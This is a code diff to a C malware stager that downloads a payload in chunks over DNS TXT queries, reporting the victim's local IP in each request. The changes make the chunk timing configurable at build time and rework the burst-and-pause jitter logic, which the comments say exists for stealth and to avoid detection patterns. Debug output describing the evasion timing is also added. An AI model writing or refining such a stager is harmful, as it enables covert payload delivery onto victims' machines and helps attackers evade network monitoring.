@@ -75,14 +75,34 @@
 #define MAX_DOMAIN_LEN 253
 #define MAX_TXT_LEN 255
 #define DNS_TIMEOUT 10
-#define MAX_RETRIES 5
-#define RETRY_DELAY_SECONDS 3  // Increased for DNS propagation
 
-// Jitter configuration for stealth
-#define MIN_CHUNK_DELAY_MS 100   // Minimum delay between chunks
-#define MAX_CHUNK_DELAY_MS 500   // Maximum delay between chunks
-#define CHUNKS_PER_BURST 10      // Number of chunks before longer pause
-#define BURST_PAUSE_MS 2000      // Pause between bursts (2 seconds)
+// Retry configuration - can be overridden at build time
+#ifndef MAX_RETRIES
+    #define MAX_RETRIES 5
+#endif
+#ifndef RETRY_DELAY_SECONDS
+    #define RETRY_DELAY_SECONDS 3  // Delay between retry attempts
+#endif
+
+// Jitter configuration for stealth - can be overridden at build time
+// Timing model: Request chunks in rapid bursts, then pause between bursts
+// Example with CHUNKS_PER_BURST=5, MIN_CHUNK_DELAY_MS=10000, MAX_CHUNK_DELAY_MS=15000, BURST_PAUSE_MS=60000:
+//   - Request 5 chunks rapidly (no delay within burst)
+//   - After 5 chunks: pause for random(10-15s) + 60s = 70-75 seconds total
+//   - Request next 5 chunks rapidly
+//   - Repeat...
+#ifndef MIN_CHUNK_DELAY_MS
+    #define MIN_CHUNK_DELAY_MS 100   // Minimum jitter delay between bursts (milliseconds)
+#endif
+#ifndef MAX_CHUNK_DELAY_MS
+    #define MAX_CHUNK_DELAY_MS 500   // Maximum jitter delay between bursts (milliseconds)
+#endif
+#ifndef CHUNKS_PER_BURST
+    #define CHUNKS_PER_BURST 10      // Number of chunks to request rapidly before pausing
+#endif
+#ifndef BURST_PAUSE_MS
+    #define BURST_PAUSE_MS 2000      // Additional pause between bursts (milliseconds)
+#endif
 
 #define MAX_CHUNKS 10000  // Maximum chunks to support
 #define CHUNK_SIZE 403  // Chunk size matching server (tested maximum for DNS infrastructure)
@@ -813,7 +833,22 @@ int main(int argc, char *argv[]) {
     unsigned char **chunks = NULL;
     size_t *chunk_sizes = NULL;
     
+    // Initialize random seed for jitter (using current time)
+    srand((unsigned int)time(NULL));
+    
     DEBUG_PRINT("[*] Starting stager...\n");
+    DEBUG_PRINT("[*] ================================================\n");
+    DEBUG_PRINT("[*] COMPILED JITTER CONFIGURATION:\n");
+    DEBUG_PRINT("[*] ------------------------------------------------\n");
+    DEBUG_PRINT("[*]   Jitter Range:  %d - %d ms (%.1f - %.1f seconds)\n", 
+                MIN_CHUNK_DELAY_MS, MAX_CHUNK_DELAY_MS, 
+                MIN_CHUNK_DELAY_MS/1000.0, MAX_CHUNK_DELAY_MS/1000.0);
+    DEBUG_PRINT("[*]   Chunks/Burst:  %d chunks requested rapidly\n", CHUNKS_PER_BURST);
+    DEBUG_PRINT("[*]   Burst Pause:   %d ms (%.1f seconds)\n", BURST_PAUSE_MS, BURST_PAUSE_MS/1000.0);
+    DEBUG_PRINT("[*]   Total Delay:   %.1f - %.1f seconds between bursts\n",
+                (MIN_CHUNK_DELAY_MS + BURST_PAUSE_MS)/1000.0,
+                (MAX_CHUNK_DELAY_MS + BURST_PAUSE_MS)/1000.0);
+    DEBUG_PRINT("[*] ================================================\n");
     
     // Get system information
     get_local_ip(local_ip, sizeof(local_ip));
@@ -857,8 +892,17 @@ int main(int argc, char *argv[]) {
     }
     
     // Request each chunk with jitter for stealth
+    int burst_number = 0;
     for (int i = 0; i < total_chunks; i++) {
-    DEBUG_PRINT("[*] Requesting chunk %d/%d\n", i+1, total_chunks);
+        // Mark the start of a new burst
+        if (i % CHUNKS_PER_BURST == 0) {
+            burst_number++;
+            DEBUG_PRINT("\n[*] ========== BURST %d START (Chunks %d-%d) ==========\n", 
+                       burst_number, i, 
+                       (i + CHUNKS_PER_BURST - 1 < total_chunks) ? i + CHUNKS_PER_BURST - 1 : total_chunks - 1);
+        }
+        
+        DEBUG_PRINT("[*] Requesting chunk %d/%d\n", i+1, total_chunks);
         
         // Send ACK|<chunk_index>|<IP>|UNKN0WN (longer message with session identifier)
         snprintf(message, sizeof(message), "ACK|%d|%s|UNKN0WN", i, local_ip);
@@ -884,25 +928,36 @@ int main(int argc, char *argv[]) {
         memcpy(chunks[i], response + 6, chunk_len + 1);
         chunk_sizes[i] = chunk_len;
         
-        // Add jitter between requests to avoid detection patterns
-        if (i < total_chunks - 1) {
-            // Every N chunks, take a longer pause (burst control)
-            if ((i + 1) % CHUNKS_PER_BURST == 0) {
+        // Apply timing delay ONLY after completing a burst
+        // Within a burst, chunks are requested rapidly with no delay
+        if (i < total_chunks - 1 && (i + 1) % CHUNKS_PER_BURST == 0) {
+            DEBUG_PRINT("\n[*] ========== BURST %d COMPLETE ==========\n", burst_number);
+            DEBUG_PRINT("[*] Completed burst of %d chunks (chunk %d/%d)\n", CHUNKS_PER_BURST, i + 1, total_chunks);
+            
+            // Calculate total delay: jitter + burst pause
+            int jitter_delay = MIN_CHUNK_DELAY_MS + (rand() % (MAX_CHUNK_DELAY_MS - MIN_CHUNK_DELAY_MS + 1));
+            int total_delay = jitter_delay + BURST_PAUSE_MS;
+            
+            DEBUG_PRINT("[*] Applying delay before next burst:\n");
+            DEBUG_PRINT("    ├─ Jitter:      %dms (%.1fs)\n", jitter_delay, jitter_delay/1000.0);
+            DEBUG_PRINT("    ├─ Burst pause: %dms (%.1fs)\n", BURST_PAUSE_MS, BURST_PAUSE_MS/1000.0);
+            DEBUG_PRINT("    └─ Total delay: %dms (%.1fs)\n\n", total_delay, total_delay/1000.0);
+            
 #ifdef _WIN32
-                Sleep(BURST_PAUSE_MS);
+            Sleep(total_delay);  // Windows Sleep takes milliseconds
 #else
-                usleep(BURST_PAUSE_MS * 1000);
-#endif
-            DEBUG_PRINT("[*] Burst pause (%dms)\n", BURST_PAUSE_MS);
-            } else {
-                // Random jitter between min and max delay
-                int delay = MIN_CHUNK_DELAY_MS + (rand() % (MAX_CHUNK_DELAY_MS - MIN_CHUNK_DELAY_MS + 1));
-#ifdef _WIN32
-                Sleep(delay);
-#else
-                usleep(delay * 1000);
-#endif
+            // Linux: use sleep() for seconds + usleep() for milliseconds remainder
+            // usleep() has a limit of 999,999 microseconds (< 1 second)
+            int seconds = total_delay / 1000;
+            int milliseconds = total_delay % 1000;
+            if (seconds > 0) {
+                sleep(seconds);  // sleep() takes seconds
             }
+            if (milliseconds > 0) {
+                usleep(milliseconds * 1000);  // usleep() takes microseconds
+            }
+#endif
+            DEBUG_PRINT("[*] Delay complete, requesting next burst\n");
         }
     }
     
